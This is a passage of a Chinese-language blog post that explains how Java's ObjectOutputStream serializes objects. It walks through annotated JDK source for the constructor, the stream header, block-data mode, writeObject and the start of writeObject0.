&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ——— 将 DataOutput 的核心写法自己实现（示例只实现最基本的）———</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123; out.write(b); &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> IOException &#123; out.write(b, off, len); &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123; out.flush(); &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123; out.close(); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeInt</span><span class="params">(<span class="type">int</span> v)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.write((v &gt;&gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        out.write((v &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        out.write((v &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        out.write(v &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">var</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">     <span class="type">var</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleObjectOutputStream</span>(baos)) &#123;</span><br><span class="line">    oos.writeObject(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    oos.writeObject(<span class="string">&quot;World&quot;</span>);</span><br><span class="line">    oos.flush();</span><br><span class="line">    <span class="type">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">    <span class="comment">// bytes 就是你自定义的“序列化格式”，需要配套的 SimpleObjectInputStream 解析</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="有参构造函数"><a href="#有参构造函数" class="headerlink" title="有参构造函数"></a>有参构造函数</h4><p>当我们使用 <code>ObjectOutputStream(OutputStream out)</code> 创建一个对象输出流并进行序列化时，实际调用的是该<strong>带参构造函数</strong>，它的实现如下所示。可以看到，这里 <code>enableOverride</code> 被设置为 <code>false</code>，意味着后续调用 <code>writeObject()</code> 等方法时，会使用 JDK 默认实现，而不是某个子类可能自定义的版本。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建一个写入到指定 OutputStream 的 ObjectOutputStream。</span></span><br><span class="line"><span class="comment"> * 本构造函数会立即向“底层 out 流”写入 Java 序列化协议的**流头部（stream header）**；</span></span><br><span class="line"><span class="comment"> * 调用者通常会在构造后立刻调用 flush()，以避免对端的 ObjectInputStream</span></span><br><span class="line"><span class="comment"> * 在读取头部时发生阻塞。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;安全管理器（SecurityManager）说明：</span></span><br><span class="line"><span class="comment"> * 如果已安装 SecurityManager，并且本构造器是由某个**子类的构造器**直接或间接调用，</span></span><br><span class="line"><span class="comment"> * 且该子类**重写**了 ObjectOutputStream.putFields 或</span></span><br><span class="line"><span class="comment"> * ObjectOutputStream.writeUnshared 等**安全敏感方法**，</span></span><br><span class="line"><span class="comment"> * 则会检查 SerializablePermission(&quot;enableSubclassImplementation&quot;) 权限。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> out  要写入的底层输出流（不得为 null）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException         写序列化流头部时发生 I/O 错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException   若不受信任的子类非法重写了安全敏感方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException 若 out 为 null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.4</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectOutputStream#ObjectOutputStream()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectOutputStream#putFields()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectInputStream#ObjectInputStream(InputStream)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 在真正初始化前做一次“子类校验”：如果调用栈中存在自定义子类且其</span></span><br><span class="line">    <span class="comment">// 重写了某些受保护/敏感的方法（如 writeUnshared/putFields），必须具备相应权限。</span></span><br><span class="line">    verifySubclass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将底层 OutputStream 包装为“块数据输出流”：</span></span><br><span class="line">    <span class="comment">// Java 序列化协议（Object Serialization Stream Protocol）中，</span></span><br><span class="line">    <span class="comment">// 普通数据常以 block-data 的形式写出（带长度前缀的块）。</span></span><br><span class="line">    bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 句柄表（handle table）：为已经写出的对象分配/管理“句柄 ID”，</span></span><br><span class="line">    <span class="comment">// 用于处理对象图中的共享引用与循环引用。</span></span><br><span class="line">    <span class="comment">// 初始容量 10，装载因子约 3.0（阈值 = 容量 * 装载因子）。</span></span><br><span class="line">    handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 替换表（substitution table）：在启用 writeReplace/enableReplaceObject</span></span><br><span class="line">    <span class="comment">// 的场景下，把某个待写对象替换成另一个对象（例如代理/值对象）再进行序列化。</span></span><br><span class="line">    subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标记当前采用“默认实现”而非“子类自定义实现”。</span></span><br><span class="line">    <span class="comment">// 当 enableOverride 为 true 时，表示子类选择自行接管写出流程。</span></span><br><span class="line">    enableOverride = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写出序列化流头部（magic、version 等），与对端 OIS 的 readStreamHeader 对应。</span></span><br><span class="line">    writeStreamHeader();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入“块数据模式”（block data mode），后续基本写入都按数据块+长度前缀编码。</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若开启扩展调试信息，则初始化调试栈，用于在异常时附加</span></span><br><span class="line">    <span class="comment">// “当前正在写哪个类/哪个字段”等上下文信息，便于定位问题。</span></span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        debugInfoStack = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在构造函数的最开始，<code>verifySubclass()</code> 用于检查<strong>调用栈中是否存在继承了 ObjectOutputStream 的自定义子类</strong>。如果存在且该子类重写了敏感方法（如 <code>writeUnshared()</code>），且当前 JVM 安装了 <code>SecurityManager</code>，那么必须具备 <code>SerializablePermission(&quot;enableSubclassImplementation&quot;)</code> 权限。否则会抛出 <code>SecurityException</code>。</p>
<p>接着将传入的 <code>OutputStream</code> 封装为 <code>BlockDataOutputStream</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将底层 OutputStream 包装为“块数据输出流”：</span></span><br><span class="line"><span class="comment">// Java 序列化协议（Object Serialization Stream Protocol）中，</span></span><br><span class="line"><span class="comment">// 普通数据常以 block-data 的形式写出（带长度前缀的块）。</span></span><br><span class="line">bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);</span><br></pre></td></tr></table></figure></div>

<p><code>BlockDataOutputStream</code> 是专用于 Java 序列化的输出封装类，它将数据写成<strong>块数据格式</strong>（block data），并配合 <code>ObjectInputStream</code> 使用的 <code>BlockDataInputStream</code> 实现数据对齐与高效读写。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates new BlockDataOutputStream on top of given underlying stream.</span></span><br><span class="line"><span class="comment"> * Block data mode is turned off by default.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">BlockDataOutputStream(OutputStream out) &#123;</span><br><span class="line">    <span class="built_in">this</span>.out = out;</span><br><span class="line">    dout = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这是 Java 内建序列化协议（Object Serialization Stream Protocol）的实现细节，和 <code>ObjectInputStream</code> 对应的 <code>BlockDataInputStream</code> 配套，负责在“<strong>块数据模式</strong>”与“<strong>非块模式</strong>”（写对象&#x2F;类描述等结构化标记，比如 <code>TC_OBJECT</code>、<code>TC_CLASSDESC</code>、<code>TC_REFERENCE</code>）之间切换，保证两边读写严格对齐。</p>
<p>之后调用 <code>writeStreamHeader()</code> 写出序列化头部内容：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写出序列化流头部（magic、version 等），与对端 OIS 的 readStreamHeader 对应。</span></span><br><span class="line">writeStreamHeader();</span><br></pre></td></tr></table></figure></div>

<p>也就是写出两个短整型值：魔数 <code>0xACED</code> 与版本号 <code>0x0005</code>，这些会被接收方 <code>ObjectInputStream</code> 在 <code>readStreamHeader()</code> 时读取并校验。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeStreamHeader</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    bout.writeShort(STREAM_MAGIC);   <span class="comment">// 0xACED</span></span><br><span class="line">    bout.writeShort(STREAM_VERSION); <span class="comment">// 0x0005</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>块数据模式下，所有原始类型、数组等写入操作都会自动被包装为带有长度前缀的块（使用 <code>TC_BLOCKDATA</code> 或 <code>TC_BLOCKDATALONG</code> 标签），可以减少标记开销、提升解码效率。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进入“块数据模式”（block data mode），后续基本写入都按数据块+长度前缀编码。</span></span><br><span class="line">bout.setBlockDataMode(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="writeObject-序列化"><a href="#writeObject-序列化" class="headerlink" title="writeObject 序列化"></a>writeObject 序列化</h3><p>当 <code>ObjectOutputStream</code> 的 <code>public</code> 构造方法走完后，才会调用 <code>writeObject()</code> 开始写对象数据，该方法的主要代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定对象写入到此 ObjectOutputStream。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;写出的内容包括：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对象的&lt;b&gt;运行时类&lt;/b&gt;及其&lt;b&gt;类签名&lt;/b&gt;（如 serialVersionUID 等元信息）；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;该类及其所有父类中&lt;b&gt;非 transient 且非 static&lt;/b&gt;的实例字段的当前值；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对象引用指向的其它对象会被&lt;b&gt;传递性&lt;/b&gt;写出，从而使读端可以重建完整的对象图。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;默认序列化可以通过在类中定义私有的 &#123;<span class="doctag">@code</span> writeObject(ObjectOutputStream)&#125;</span></span><br><span class="line"><span class="comment"> * 与 &#123;<span class="doctag">@code</span> readObject(ObjectInputStream)&#125; 方法来&lt;b&gt;覆盖&lt;/b&gt;，以实现自定义序列化逻辑。</span></span><br><span class="line"><span class="comment"> * 若对象实现了 &#123;<span class="doctag">@link</span> java.io.Externalizable&#125;，则改为走 &#123;<span class="doctag">@code</span> writeExternal/readExternal&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;异常处理：若写出过程中发生异常，将抛出到调用者；该异常通常使本输出流处于&lt;b&gt;未定义状态&lt;/b&gt;。</span></span><br><span class="line"><span class="comment"> * 当异常发生于&lt;b&gt;最外层&lt;/b&gt;写入（见下文 depth==0）时，当前实现还会在流中写入一个</span></span><br><span class="line"><span class="comment"> * “致命异常”标记，读端在随后读取时会抛出 &#123;<span class="doctag">@link</span> java.io.WriteAbortedException&#125;，</span></span><br><span class="line"><span class="comment"> * 其 cause 为这里的原始异常。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj 要写出的对象（可为 &#123;<span class="doctag">@code</span> null&#125;，此时会写入协议常量 TC_NULL）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException    用于序列化的某个类不合法（如 serialVersionUID 不匹配等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NotSerializableException 待写对象中存在未实现 &#123;<span class="doctag">@link</span> java.io.Serializable&#125; 的类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException              底层输出流抛出的任意 I/O 异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 若当前 OOS 处于“子类完全接管模式”（通过受保护的无参构造器启用），</span></span><br><span class="line">    <span class="comment">// 则调用子类的覆盖实现；否则使用本类标准实现。</span></span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">        writeObjectOverride(obj);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 核心写入：writeObject0 负责对象图遍历、类描述写出、字段编码、句柄表维护等。</span></span><br><span class="line">        <span class="comment">// 第二个参数 unshared=false 表示采用“可共享语义”（允许后续用 TC_REFERENCE 引用同一实例），</span></span><br><span class="line">        <span class="comment">// 与 writeUnshared(obj)（会传入 true）区分。</span></span><br><span class="line">        <span class="comment">// 允许 obj 为 null：内部会写协议常量 TC_NULL。</span></span><br><span class="line">        writeObject0(obj, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="comment">// depth 表示当前写入调用的“嵌套深度”（写字段/子对象时会递增）。</span></span><br><span class="line">        <span class="comment">// 仅当处于最外层（depth==0）时，向流写入“致命异常”标记与异常对象，</span></span><br><span class="line">        <span class="comment">// 以便读端在后续读取时能感知并抛出 WriteAbortedException。</span></span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">            writeFatalException(ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 重新抛出给调用者；此后该流通常应被关闭或丢弃。</span></span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="writeObject0"><a href="#writeObject0" class="headerlink" title="writeObject0"></a>writeObject0</h4><p>当 <code>enableOverride</code> 为 <code>true</code> 时调用的是 <code>ObjectOutputStream</code> 子类实现的 <code>writeObjectOverride</code>；否则会调用 JDK 自身实现的 <code>writeObject0</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 底层实现：供 &#123;<span class="doctag">@link</span> #writeObject(Object)&#125; / &#123;<span class="doctag">@link</span> #writeUnshared(Object)&#125; 调用。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;流程总览：&lt;/b&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;暂时关闭“块数据模式”（block-data mode），并增加写入深度 &#123;<span class="doctag">@code</span> depth&#125;（用于异常处理与嵌套写入）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;通过替换表 &#123;<span class="doctag">@code</span> subs.lookup(obj)&#125; 做一次“规范化/已知替换”的查找；若对象为 &#123;<span class="doctag">@code</span> null&#125; 则写出 &#123;<span class="doctag">@code</span> TC_NULL&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;在允许共享（&#123;<span class="doctag">@code</span> unshared == false&#125;）的情况下，查询句柄表 &#123;<span class="doctag">@code</span> handles&#125;，</span></span><br><span class="line"><span class="comment"> *       若该对象此前已写出，则仅写出 &#123;<span class="doctag">@code</span> TC_REFERENCE&#125;+句柄ID 并返回。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;特殊类型分支：若是 &#123;<span class="doctag">@code</span> Class&#125; 或 &#123;<span class="doctag">@code</span> ObjectStreamClass&#125;，走专门的写出逻辑。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;执行 writeReplace 链（类私有的 &#123;<span class="doctag">@code</span> writeReplace()&#125;）以及启用时的全局替换钩子</span></span><br><span class="line"><span class="comment"> *       &#123;<span class="doctag">@code</span> replaceObject(obj)&#125;，直至替换稳定。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若发生替换（&#123;<span class="doctag">@code</span> obj != orig&#125;），将映射登记到 &#123;<span class="doctag">@code</span> subs.assign(orig, obj)&#125;，</span></span><br><span class="line"><span class="comment"> *       并再次执行第 2～4 步（因为替换可能把对象变成 &#123;<span class="doctag">@code</span> null&#125; / 已写出对象 / Class / ObjectStreamClass）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;剩余分派：字符串 / 数组 / 枚举 / 实现了 &#123;<span class="doctag">@link</span> java.io.Serializable&#125; 的常规对象；</span></span><br><span class="line"><span class="comment"> *       否则抛出 &#123;<span class="doctag">@link</span> NotSerializableException&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;最终在 &#123;<span class="doctag">@code</span> finally&#125; 中恢复写入深度与原来的块数据模式。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;&#123;<span class="doctag">@code</span> unshared&#125; 的含义：&lt;/b&gt;当为 &#123;<span class="doctag">@code</span> true&#125;（来自 &#123;<span class="doctag">@link</span> #writeUnshared(Object)&#125;）</span></span><br><span class="line"><span class="comment"> * 时，禁止将此对象用句柄共享（即便之前出现过也当作“新实例”写出）；读取端需对应用</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> readUnshared&#125; 语义处理。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj      待写对象（可为 &#123;<span class="doctag">@code</span> null&#125;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> unshared 是否使用“非共享”语义</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 底层 I/O 或协议写出过程中的异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject0</span><span class="params">(Object obj, <span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// ① 进入“结构化写入”阶段：先切到“非块数据模式”</span></span><br><span class="line">    <span class="comment">//    - 非块模式：用于写协议的结构标记（如 TC_OBJECT/TC_CLASSDESC 等），这些标记不能被</span></span><br><span class="line">    <span class="comment">//      包进块数据；否则接收端无法正确分段解析。</span></span><br><span class="line">    <span class="comment">//    - setBlockDataMode(false) 返回调用前的模式，以便 finally 时恢复（保证读写对齐）。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ② 记录写入深度：</span></span><br><span class="line">    <span class="comment">//    - depth 用于跟踪嵌套层级；部分异常处理（例如致命异常封装）会参考 depth 是否回到 0。</span></span><br><span class="line">    depth++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// =====================  第一段：快速路径（null / 已写出 / 特例）  =====================</span></span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.1 替换表标准化：</span></span><br><span class="line">        <span class="comment">//     subs.lookup(obj) 会将“曾被 writeReplace/replaceObject 确定过的替换关系”</span></span><br><span class="line">        <span class="comment">//     进行稳定化；对 null 直接返回 null。</span></span><br><span class="line">        <span class="keyword">if</span> ((obj = subs.lookup(obj)) == <span class="literal">null</span>) &#123;</span><br><span 